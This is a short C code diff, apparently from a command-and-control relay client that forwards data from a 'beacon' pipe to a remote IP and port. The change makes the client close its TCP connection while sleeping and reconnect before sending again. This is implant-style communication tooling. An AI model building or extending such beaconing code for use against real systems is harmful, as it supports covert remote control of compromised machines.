@@ -303,7 +303,21 @@ void main(int argc, char* argv[])
 		if (read_size == 1)
 		{
 			debug_print("Finished sending, sleeping %d seconds..\n", sleep);
+			// Close TCP connection, sleep, open new TCP connection
+			closesocket(sockfd);
+			sockfd = INVALID_SOCKET;
+
 			Sleep(sleep*1000);
+
+			sockfd = create_socket(IP, PORT, TIMEOUT_SEC);
+			if (sockfd == INVALID_SOCKET)
+			{
+				debug_print("%s", "Socket creation error!\n");
+				free(payload);
+				free(buffer);
+				CloseHandle(beaconPipe);
+				exit(1);
+			}
 		}
 
 		int send_size = sendData(sockfd, buffer, read_size);
